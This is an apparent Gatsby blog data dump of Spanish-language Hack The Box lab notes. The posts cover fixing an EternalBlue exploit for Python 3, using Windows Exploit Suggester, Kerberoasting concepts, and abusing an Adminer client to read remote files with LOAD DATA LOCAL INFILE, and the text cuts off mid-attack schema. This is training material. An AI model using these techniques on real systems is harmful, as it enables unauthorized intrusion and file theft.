error</span>\n<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span> <span class=\"token operator\">*</span> padLen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ❌ fail: TypeError: can't multiply sequence by non-int of type 'str'</span>\n<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>padLen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ✅ success: data ya era bytes</span>\n<span class=\"token string\">b'\\x00'</span> <span class=\"token operator\">*</span> padLen <span class=\"token operator\">+</span> data</code></pre></div>\n<h3>Modernizando Python 2: Common Crash</h3>\n<p><code class=\"language-text\">str.encode(data)</code> es uno de los crashes más típicos que aparecen al intentar “modernizar” exploits hechos para Python 2.</p>\n<p><code class=\"language-text\">str.encode(data)</code> intenta usar el parámetro data como <em>codec name</em>, no como contenido. Cualquier exploit antiguo que veas con <code class=\"language-text\">str.encode(data)</code> o concatenaciones sin prefijo <code class=\"language-text\">b''</code> está casi garantizado que romperá.</p>\n<p><strong>str.encode(data) produce errores como:</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">UnicodeDecodeError: <span class=\"token string\">'ascii'</span> codec can<span class=\"token string\">'t decode byte ...\nTypeError: descriptor '</span>encode<span class=\"token string\">' requires a '</span>str<span class=\"token string\">' object but received '</span>bytes<span class=\"token string\">'\nTypeError: can'</span>t concat str to bytes</code></pre></div>","categories":["KEV","EternalBlue","Windows 7","SMBv1"],"date":"November 21, 2025","description":"How to identify Eternal Blue","id":"597070ae-7f67-5279-8475-df1085d4986b","keywords":["KEV","EternalBlue","Windows 7","SMBv1"],"slug":"/eternal-blue/","title":"Eternal Blue","readingTime":{"text":"5 min read"}},{"banner":{"alt":"Fork image","caption":"Photo by <a href=\"https://unsplash.com/@julianwallnerphotoworks\">Julian Wallner</a> on Unsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAgJBf/EABQBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAaw78mqPjECLh//EABsQAAEFAQEAAAAAAAAAAAAAAAUCAwQGBwAR/9oACAEBAAEFAiyiA3qvZXbA2tpPuBzC2kHYz0yE/L0iwCyv/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAIhAAAgMAAgICAwEAAAAAAAAAAgMBBAUREgYTABQhIiQz/9oACAEBAAY/Aqr8OojRvssQCM6xpLyxtzAGxiV2GqcHu9YSQhIcTETJkARJRbRp4Ol4zt55wN3H1PWyZUccqvZ15H8mrnM/z+5UmQVZFlV3Vo/t83fIfLNzXvamZjjOW0LQoTmFfcaXFRqgr61eYUHUeqvz2KXe2esji41m9Z2O3IBqakqnZR74Lsab1BVDg4HgOxrPuIjDvbxHzbyOmdfXk6jaKLd1DouOSCK7RKzNG1Sqm3lxRJrqq7REdok+xF//xAAYEAEAAwEAAAAAAAAAAAAAAAABABEhMf/aAAgBAQABPyEpHngqOJJCmIpu8FPuZ4hSchDwllBOAJKIegkTpvN7dYPmFRpYkqVLyciLkqyl/9oADAMBAAIAAwAAABAQz//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QP//EABgQAQADAQAAAAAAAAAAAAAAAAEAEVEQ/9oACAEBAAE/EENAL8oLFRBwwd22qedechAkozdVNhq47AT5CxWqYkLjE5Pcoka4g09G4WI86VtM1/Zf/9k="},"images":{"fallback":{"src":"/static/c3c128995adb209361776508bdae37fd/91671/fork.jpg","srcSet":"/static/c3c128995adb209361776508bdae37fd/7e3b4/fork.jpg 165w,\n/static/c3c128995adb209361776508bdae37fd/47f88/fork.jpg 330w,\n/static/c3c128995adb209361776508bdae37fd/91671/fork.jpg 660w,\n/static/c3c128995adb209361776508bdae37fd/5aaff/fork.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/c3c128995adb209361776508bdae37fd/322ad/fork.webp 165w,\n/static/c3c128995adb209361776508bdae37fd/de3b3/fork.webp 330w,\n/static/c3c128995adb209361776508bdae37fd/2b2b5/fork.webp 660w,\n/static/c3c128995adb209361776508bdae37fd/e36a7/fork.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>Simple process to push changes to a forked repo</h1>\n<p>Let's say I want to push changes to a forked repo, not the original, because the orginal repo has been archived.</p>\n<ol>\n<li>Fork the forked repo</li>\n<li>Create a branch for your changes</li>\n<li>Push to your fork</li>\n<li>Open a PR in your repo, from your branch to the fork</li>\n</ol>\n<ul>\n<li>Conditions\n<ul>\n<li>The fork you're pushing to must be public</li>\n<li>The fork you're pushing to must have PRs enabled (Nobody disables it)</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>Github allows PRs between public forks as well as between public repos, so no special permissions are need, knowing the propietary is also not need.</p>\n</blockquote>","categories":["How-To","forks"],"date":"November 19, 2025","description":"How to pushing changes to forked Github Repo we own","id":"3a8a8d54-e43a-5b3a-a204-588b8663a426","keywords":["How-To","forks"],"slug":"/forking/","title":"Forking","readingTime":{"text":"1 min read"}},{"banner":{"alt":"Database typical icon","caption":"Photo by <a href=\"https://unsplash.com/@julianwallnerphotoworks\">Julian Wallner</a> on Unsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAgJBf/EABQBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAaw78mqPjECLh//EABsQAAEFAQEAAAAAAAAAAAAAAAUCAwQGBwAR/9oACAEBAAEFAiyiA3qvZXbA2tpPuBzC2kHYz0yE/L0iwCyv/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAIhAAAgMAAgICAwEAAAAAAAAAAgMBBAUREgYTABQhIiQz/9oACAEBAAY/Aqr8OojRvssQCM6xpLyxtzAGxiV2GqcHu9YSQhIcTETJkARJRbRp4Ol4zt55wN3H1PWyZUccqvZ15H8mrnM/z+5UmQVZFlV3Vo/t83fIfLNzXvamZjjOW0LQoTmFfcaXFRqgr61eYUHUeqvz2KXe2esji41m9Z2O3IBqakqnZR74Lsab1BVDg4HgOxrPuIjDvbxHzbyOmdfXk6jaKLd1DouOSCK7RKzNG1Sqm3lxRJrqq7REdok+xF//xAAYEAEAAwEAAAAAAAAAAAAAAAABABEhMf/aAAgBAQABPyEpHngqOJJCmIpu8FPuZ4hSchDwllBOAJKIegkTpvN7dYPmFRpYkqVLyciLkqyl/9oADAMBAAIAAwAAABAQz//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QP//EABgQAQADAQAAAAAAAAAAAAAAAAEAEVEQ/9oACAEBAAE/EENAL8oLFRBwwd22qedechAkozdVNhq47AT5CxWqYkLjE5Pcoka4g09G4WI86VtM1/Zf/9k="},"images":{"fallback":{"src":"/static/c3c128995adb209361776508bdae37fd/91671/fork.jpg","srcSet":"/static/c3c128995adb209361776508bdae37fd/7e3b4/fork.jpg 165w,\n/static/c3c128995adb209361776508bdae37fd/47f88/fork.jpg 330w,\n/static/c3c128995adb209361776508bdae37fd/91671/fork.jpg 660w,\n/static/c3c128995adb209361776508bdae37fd/5aaff/fork.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/c3c128995adb209361776508bdae37fd/322ad/fork.webp 165w,\n/static/c3c128995adb209361776508bdae37fd/de3b3/fork.webp 330w,\n/static/c3c128995adb209361776508bdae37fd/2b2b5/fork.webp 660w,\n/static/c3c128995adb209361776508bdae37fd/e36a7/fork.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>windows exploit suggester</h1>\n<p>He <a href=\"https://github.com/bongx00/Windows-Exploit-Suggester\">forkeado</a> el repo, inclui la seccion INSTALLATION, e hice el PR al fork del que he forkeado (el projecto de <a href=\"https://github.com/Riqky/Windows-Exploit-Suggester\">Riqky</a> que limpia el projecto original quitando dependencias obsoletas y upgradea a Python 3).</p>\n<h2>Limpieza del README</h2>\n<p>En mi fork he liampiado tralla del README, No he incluido como se obtiene el systeminfo.txt, ya que es ajeno a la herramienta, pero aqui si a modo de flow completo.</p>\n<h1>INSTALLATION</h1>\n<p>Extract external packages in use with pipreqs.</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token comment\"># Python 3</span>\npip <span class=\"token function\">install</span> pipreqs\npipreqs <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">--force</span> <span class=\"token parameter variable\">--ignore</span> .venv\npip <span class=\"token function\">install</span> <span class=\"token parameter variable\">-r</span> requirements.txt</code></pre></div>\n<h1>USAGE</h1>\n<ul>\n<li>Create the systeminfo file</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">C:<span class=\"token punctuation\">\\</span>Users<span class=\"token punctuation\">\\</span>tolis<span class=\"token punctuation\">\\</span>Desktop<span class=\"token operator\">></span>systeminfo <span class=\"token operator\">></span> systeminfo.txt\n\nC:<span class=\"token punctuation\">\\</span>Users<span class=\"token punctuation\">\\</span>tolis<span class=\"token punctuation\">\\</span>Desktop<span class=\"token operator\">></span>type systeminfo.txt\nHost Name:                 ARCTIC\nOS Name:                   Microsoft Windows Server <span class=\"token number\">2008</span> R2 Standard \nOS Version:                <span class=\"token number\">6.1</span>.7600 N/A Build <span class=\"token number\">7600</span>\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Server\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          Windows User</code></pre></div>\n<ul>\n<li>Create the microsoft database</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">$ ./windows-exploit-suggester.py <span class=\"token parameter variable\">--update</span>\n\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> initiating<span class=\"token punctuation\">..</span>.\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> successfully requested base url\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> scraped ms download url\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> writing to <span class=\"token function\">file</span> <span class=\"token number\">2014</span>-06-06-mssb.xlsx\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> <span class=\"token keyword\">done</span></code></pre></div>\n<ul>\n<li>Run with \"systeminfo\" output and microsoft database</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">$ ./windows-exploit-suggester.py <span class=\"token parameter variable\">--database</span> <span class=\"token number\">2014</span>-06-06-mssb.xlsx <span class=\"token parameter variable\">--systeminfo</span> win7sp1-systeminfo.txt\n\n<span class=\"token punctuation\">[</span>M<span class=\"token punctuation\">]</span> MS14-012: Cumulative Security Update <span class=\"token keyword\">for</span> Internet Explorer <span class=\"token punctuation\">(</span><span class=\"token number\">2925418</span><span class=\"token punctuation\">)</span> - Critical\n<span class=\"token punctuation\">[</span>E<span class=\"token punctuation\">]</span> MS13-101: Vulnerabilities <span class=\"token keyword\">in</span> Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class=\"token punctuation\">(</span><span class=\"token number\">2880430</span><span class=\"token punctuation\">)</span> - Important\n<span class=\"token punctuation\">[</span>M<span class=\"token punctuation\">]</span> MS13-090: Cumulative Security Update of ActiveX Kill Bits <span class=\"token punctuation\">(</span><span class=\"token number\">2900986</span><span class=\"token punctuation\">)</span> - Critical</code></pre></div>\n<ul>\n<li>exploits by operating system</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">$ ./windows-exploit-suggester.py <span class=\"token parameter variable\">--database</span> <span class=\"token number\">2014</span>-06-06-mssb.xlsx <span class=\"token parameter variable\">--ostext</span> <span class=\"token string\">'windows server 2008 r2'</span>\n\n<span class=\"token punctuation\">[</span>M<span class=\"token punctuation\">]</span> MS13-009: Cumulative Security Update <span class=\"token keyword\">for</span> Internet Explorer <span class=\"token punctuation\">(</span><span class=\"token number\">2792100</span><span class=\"token punctuation\">)</span> - Critical\n<span class=\"token punctuation\">[</span>M<span class=\"token punctuation\">]</span> MS13-005: Vulnerability <span class=\"token keyword\">in</span> Windows Kernel-Mode Driver Could Allow Elevation of Privilege <span class=\"token punctuation\">(</span><span class=\"token number\">2778930</span><span class=\"token punctuation\">)</span> - Important\n<span class=\"token punctuation\">[</span>E<span class=\"token punctuation\">]</span> MS11-011: Vulnerabilities <span class=\"token keyword\">in</span> Windows Kernel Could Allow Elevation of Privilege <span class=\"token punctuation\">(</span><span class=\"token number\">2393802</span><span class=\"token punctuation\">)</span> - Important</code></pre></div>","categories":["tool","windows-exploit-suggester"],"date":"November 19, 2025","description":"Forkeando windows-exploit-suggester","id":"aa57dd94-e269-5471-9149-e1abef4ad708","keywords":["tool","windows-exploit-suggester"],"slug":"/windows-exploit-suggester/","title":"Windows Exploit Suggester","readingTime":{"text":"2 min read"}},{"banner":{"alt":"Microsoft Windows Icon","caption":"Photo by <a href=\"https://unsplash.com/@stadsa\">Tadas Sar</a> onUnsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAcIAwX/xAAXAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAGNenLbFKyEUaL/xAAaEAADAQADAAAAAAAAAAAAAAACAwUEAAEG/9oACAEBAAEFAsDULVboGteisgO/NUzq83qKcoqzmH//xAAYEQADAQEAAAAAAAAAAAAAAAAAUfARkf/aAAgBAwEBPwFSMuH/xAAZEQACAwEAAAAAAAAAAAAAAAAAARGB8JH/2gAIAQIBAT8BSWojcP/EACcQAAMAAQIEBgMBAAAAAAAAAAECAwQFEgAREyEGFCIjMjMVQVFx/9oACAEBAAY/Ao5scrw74grqDhPwi5eQMhHZjQrN4iqRTHn6qUyJzE9n2szANTCnpet4GZfHqZY+Drfn8NpgBKO4elLwgu/kSMdKN9cfc5cTm+qaUplGc9t9CXHogQcgpmzQI5fr2/8ASTzPDY+di4VVO1S/Q21YKdy83Vx8W9Q7dm7jiuTgZOTjPy2sOr5hKTXuknGYMk9OZ3GaKyhS7kfLh65EMXLtZuo1Miblh6VUIgSk0SahRtUL/T3JPH//xAAYEAEBAQEBAAAAAAAAAAAAAAABESEAMf/aAAgBAQABPyEUjuCPKeFTjq+PueIQCptdBkFvzmqxbESFOcL0MKRe0BHAgSTjuXz0NBsgXCp470K1AZjh4VFB/9oADAMBAAIAAwAAABDIz//EAB0RAAICAQUAAAAAAAAAAAAAAAERMWEAIVGBkbH/2gAIAQMBAT8QIJYltGLBSlrWEWYna/DHQ4//xAAcEQACAgIDAAAAAAAAAAAAAAABESExAMFhcfD/2gAIAQIBAT8QNKVLqGG7DkhrAwBECFe3Ppf/xAAYEAEBAQEBAAAAAAAAAAAAAAABABEhQf/aAAgBAQABPxDGSn/nQRtfbb5B4J9HXJ8au9aUHodwbEmhJi6Q9CDZRm+BMLyXh8byxCiUOYAlKJhVrKa//9k="},"images":{"fallback":{"src":"/static/ca216dba721b682d232715f47e9aae6c/91671/windows.jpg","srcSet":"/static/ca216dba721b682d232715f47e9aae6c/7e3b4/windows.jpg 165w,\n/static/ca216dba721b682d232715f47e9aae6c/47f88/windows.jpg 330w,\n/static/ca216dba721b682d232715f47e9aae6c/91671/windows.jpg 660w,\n/static/ca216dba721b682d232715f47e9aae6c/5aaff/windows.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/ca216dba721b682d232715f47e9aae6c/322ad/windows.webp 165w,\n/static/ca216dba721b682d232715f47e9aae6c/de3b3/windows.webp 330w,\n/static/ca216dba721b682d232715f47e9aae6c/2b2b5/windows.webp 660w,\n/static/ca216dba721b682d232715f47e9aae6c/e36a7/windows.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>Que aprendi de la maquina Arctic</h1>\n<h2>De MS00-0000 to CVE-0000-0000</h2>\n<p>Always search CVE's. Once you find the prospect of system vulnerabilities (Windows), try to find the CVE from that Microsoft Vulnerability.</p>\n<p>E.g., MS10-059 -> CVE-2010-2554</p>\n<h2>Info gatherig con Netcat</h2>\n<blockquote>\n<p>Esto lo hice para matar el tiempo mientras Nmap mostraba resultados. No es algo que se vea en la maquina en si.</p>\n</blockquote>\n<p>Puedo usar netcat para interactuar con un puerto abierto, pero solo obtendre información si el servicio que está detrás sabe qué responder.</p>\n<ol>\n<li>Si el puerto está abierto y nc se conecta,\n<ol>\n<li>veras que se queda esperando.</li>\n<li>Si no responde banners, solo responde ante un protocolo válido. Si el servicio no tiene mensaje de bienvenida, no verás nada.</li>\n<li>Esto es típico en servicios binarios, propietarios, o protocolos no verbosos. No entienden texto, esperan un paquete binario (con cabeceras, flags, tamaños, checksums), comandos muy específicos, o no envían ningún mensaje inicial.</li>\n<li>Puedes mandar entradas genéricas para ver si el servicio lanza un error o banner.</li>\n</ol>\n</li>\n</ol>","categories":["AD","Tool"],"date":"November 18, 2025","description":"Windows Exploit Suggester","id":"aab7b886-f00c-55f4-8e7f-e679eac0fa18","keywords":["AD","Tool"],"slug":"/htb-arctic/","title":"HTB Arctic","readingTime":{"text":"1 min read"}},{"banner":{"alt":"Microsoft Windows Icon","caption":"Photo by <a href=\"https://unsplash.com/@stadsa\">Tadas Sar</a> onUnsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAcIAwX/xAAXAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAGNenLbFKyEUaL/xAAaEAADAQADAAAAAAAAAAAAAAACAwUEAAEG/9oACAEBAAEFAsDULVboGteisgO/NUzq83qKcoqzmH//xAAYEQADAQEAAAAAAAAAAAAAAAAAUfARkf/aAAgBAwEBPwFSMuH/xAAZEQACAwEAAAAAAAAAAAAAAAAAARGB8JH/2gAIAQIBAT8BSWojcP/EACcQAAMAAQIEBgMBAAAAAAAAAAECAwQFEgAREyEGFCIjMjMVQVFx/9oACAEBAAY/Ao5scrw74grqDhPwi5eQMhHZjQrN4iqRTHn6qUyJzE9n2szANTCnpet4GZfHqZY+Drfn8NpgBKO4elLwgu/kSMdKN9cfc5cTm+qaUplGc9t9CXHogQcgpmzQI5fr2/8ASTzPDY+di4VVO1S/Q21YKdy83Vx8W9Q7dm7jiuTgZOTjPy2sOr5hKTXuknGYMk9OZ3GaKyhS7kfLh65EMXLtZuo1Miblh6VUIgSk0SahRtUL/T3JPH//xAAYEAEBAQEBAAAAAAAAAAAAAAABESEAMf/aAAgBAQABPyEUjuCPKeFTjq+PueIQCptdBkFvzmqxbESFOcL0MKRe0BHAgSTjuXz0NBsgXCp470K1AZjh4VFB/9oADAMBAAIAAwAAABDIz//EAB0RAAICAQUAAAAAAAAAAAAAAAERMWEAIVGBkbH/2gAIAQMBAT8QIJYltGLBSlrWEWYna/DHQ4//xAAcEQACAgIDAAAAAAAAAAAAAAABESExAMFhcfD/2gAIAQIBAT8QNKVLqGG7DkhrAwBECFe3Ppf/xAAYEAEBAQEBAAAAAAAAAAAAAAABABEhQf/aAAgBAQABPxDGSn/nQRtfbb5B4J9HXJ8au9aUHodwbEmhJi6Q9CDZRm+BMLyXh8byxCiUOYAlKJhVrKa//9k="},"images":{"fallback":{"src":"/static/ca216dba721b682d232715f47e9aae6c/91671/windows.jpg","srcSet":"/static/ca216dba721b682d232715f47e9aae6c/7e3b4/windows.jpg 165w,\n/static/ca216dba721b682d232715f47e9aae6c/47f88/windows.jpg 330w,\n/static/ca216dba721b682d232715f47e9aae6c/91671/windows.jpg 660w,\n/static/ca216dba721b682d232715f47e9aae6c/5aaff/windows.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/ca216dba721b682d232715f47e9aae6c/322ad/windows.webp 165w,\n/static/ca216dba721b682d232715f47e9aae6c/de3b3/windows.webp 330w,\n/static/ca216dba721b682d232715f47e9aae6c/2b2b5/windows.webp 660w,\n/static/ca216dba721b682d232715f47e9aae6c/e36a7/windows.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h2>Que aprendi de la maquina Active</h2>\n<ul>\n<li>Service Principal Name or SPNs</li>\n</ul>\n<p>Kerberos tiene dos puntos que podemos atacar</p>\n<ul>\n<li>AS_REP roasting, cuentas con flag \"DONT_REQUIERE_PREAUTH\" activada</li>\n<li>Kerberosting, SPNs para decifrar hash NTLM</li>\n</ul>\n<blockquote>\n<p>En AD las cuentas vinculadas a servicios (SPNs) son objetivos de alto interes porque los servicios suelen correr con privilegios.</p>\n</blockquote>\n<h3>Cuentas ejecutando servicios</h3>\n<p>En Windows, un servicio utiliza cuentas para correr servicios porque es como correr Apache o Nginx en Linux con una cuenta www-data.</p>\n<p>Algunas cuentas para correr servicios pueden ser:</p>\n<ul>\n<li>Con LocalSystem</li>\n<li>Con NetworkService</li>\n<li>Con una cuenta dedicada\n<ul>\n<li>Cualquier cuenta de usuario, incluso Administrator.</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>krbtgt lleva SPN, pero no es kerberoasteable. Es una cuenta interna del dominio usada por Kerberos. No es “un servicio normal”, es parte del propio protocolo Kerberos.</p>\n</blockquote>\n<h3>Relacionando Objetos, Cuentas y Servicios</h3>\n<p>El campo sAMAccountName muestra la cuenta real, \"dn\" muestra el objeto que guarda la cuenta, detras de la barra el servicio y su puerto asociado (active/CIFS:445), y lo que relaciona el sAMAccountName con el servicePrincipalName (SPN) es el objeto (\"dn: CN=Administrator,CN=Users,DC=active,DC=htb\").</p>","categories":["AD","Theory","Basic"],"date":"November 16, 2025","description":"Active Directory","id":"3ece2967-1431-5cc3-ba55-3d0f740e203e","keywords":["AD","Theory","Basic"],"slug":"/htb-active/","title":"HTB Active","readingTime":{"text":"1 min read"}},{"banner":{"alt":"Database typical icon","caption":"Photo by <a href=\"https://unsplash.com/@sunder_2k25\">Sunder Muthukumaran</a> on Unsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAUBBwgJ/8QAFAEBAAAAAAAAAAAAAAAAAAAABf/aAAwDAQACEAMQAAAB7J1PqaXQ14wAnP/EABsQAAMAAgMAAAAAAAAAAAAAAAECBQADBAYQ/9oACAEBAAEFAuxvv48uHa30KQTBgVR5/8QAHxEAAQQCAgMAAAAAAAAAAAAABAECAxMFERIiECEx/9oACAEDAQE/ATsRKXkgj2HPgjGqtGSLkhFUqyt72N4bV2l6P9fPH//EAB4RAAEDBAMAAAAAAAAAAAAAABMCAwQBBRESECFh/9oACAECAQE/AYV2jRbbKhO25Mh58wZRxhMylquWgrJprunDiO6494//xAAfEAACAgEFAQEAAAAAAAAAAAABAgMRIQAEEBIxEyL/2gAIAQEABj8C3EkMbuY/m5+aszBVlUs3VbalGWrwWdbWGMSSBe7SUrlUURtmQ+Lmh+skkDXnGFAv2scf/8QAHBABAQACAgMAAAAAAAAAAAAAAREAITFhEEFR/9oACAEBAAE/IXK5JPIFKEDHgFxFIIBTtJ0FAQK5UF2968OxtDZ+s5e245//2gAMAwEAAgADAAAAEKMP/8QAGBEBAQADAAAAAAAAAAAAAAAAAREQITH/2gAIAQMBAT8QTisMY+98O6JA3H//xAAYEQEAAwEAAAAAAAAAAAAAAAABABEhMf/aAAgBAgEBPxBvhNWu7Ro0aqgtP//EABsQAQACAwEBAAAAAAAAAAAAAAERIQAxQXHw/9oACAEBAAE/EId+boJd1TMaZVKbqQ1PG3BQzalOG/vuZYvZDJIinERPRG3B1kLBglgYBSwCFbtxQhA109z/2Q=="},"images":{"fallback":{"src":"/static/86dbe869c88a7efb3fc747229c96e82e/91671/database.jpg","srcSet":"/static/86dbe869c88a7efb3fc747229c96e82e/7e3b4/database.jpg 165w,\n/static/86dbe869c88a7efb3fc747229c96e82e/47f88/database.jpg 330w,\n/static/86dbe869c88a7efb3fc747229c96e82e/91671/database.jpg 660w,\n/static/86dbe869c88a7efb3fc747229c96e82e/5aaff/database.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/86dbe869c88a7efb3fc747229c96e82e/322ad/database.webp 165w,\n/static/86dbe869c88a7efb3fc747229c96e82e/de3b3/database.webp 330w,\n/static/86dbe869c88a7efb3fc747229c96e82e/2b2b5/database.webp 660w,\n/static/86dbe869c88a7efb3fc747229c96e82e/e36a7/database.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>Que aprendi de la maquina Admirer</h1>\n<h2>Abuso del DB-client llamado Adminer</h2>\n<p>Aqui vemos tres cosas,</p>\n<ol>\n<li>si encontramos un cliente remoto podemos hacer que se conecte a nosotros,</li>\n<li>haciendo eso logramos un entorno remoto donde ejecutar Queries o intentar cosas,</li>\n<li>si el cliente remoto permite ejecutar funciones peligrosas podriamos intentar leer archivos locales del host remoto\n<ol>\n<li>(esto es similar a lo que hacemos cuando un host-PHP nos permite ejecutar funciones como shell_exec).</li>\n</ol>\n</li>\n</ol>\n<blockquote>\n<p>Digamos que no es vulnerable sino \"abusable\" ya que su configuracion permite el uso de funciones que podemos abusar.</p>\n</blockquote>\n<h3>Ejemplo (Accedemos a un archivo y lo guardamos en una tabla para poder leerlo)</h3>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">LOAD</span> <span class=\"token keyword\">DATA</span> <span class=\"token keyword\">LOCAL</span> <span class=\"token keyword\">INFILE</span> <span class=\"token string\">'../index.php'</span>\n<span class=\"token keyword\">INTO</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">some</span><span class=\"token punctuation\">.</span>shit\n<span class=\"token keyword\">FIELDS</span> <span class=\"token keyword\">TERMINATED</span> <span class=\"token keyword\">BY</span> <span class=\"token string\">\"\\n\"</span></code></pre></div>\n<p>Esquema de Ataque</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token comment\">-- Attacker (creamos tabla, usuario y configuramos 